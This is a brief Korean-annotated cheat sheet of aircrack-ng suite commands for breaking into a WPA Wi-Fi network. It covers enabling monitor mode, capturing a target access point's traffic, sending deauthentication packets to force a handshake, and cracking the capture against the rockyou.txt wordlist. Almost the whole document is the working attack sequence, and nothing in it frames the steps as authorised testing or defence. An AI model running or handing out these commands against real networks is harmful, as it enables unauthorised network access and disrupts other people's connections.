# network

## wlan0 > wlan0mon 옵션변경
airmon-ng start wlan0

## wlan0mon 으로 radio 스캔시작
airodump-ng wlan0mon

## 특정 bssid 취득후 캡쳐시작
airodump-ng --bssid 98:F1:99:50:xx:xx -c 4 -w hackwifi-xxx wlan0mon

## 별도 cmd로 세션시도
aireplay-ng -0 4 -a 98:F1:99:50:xx:xx wlan0mon

## 캡쳐된 파일의 사전파일과 매칭시도
aircrack-ng ./hack-aterm.cap-06.cap -w ./rockyou.txt 

## wlan0mon STOP
airmon-ng stop wlan0
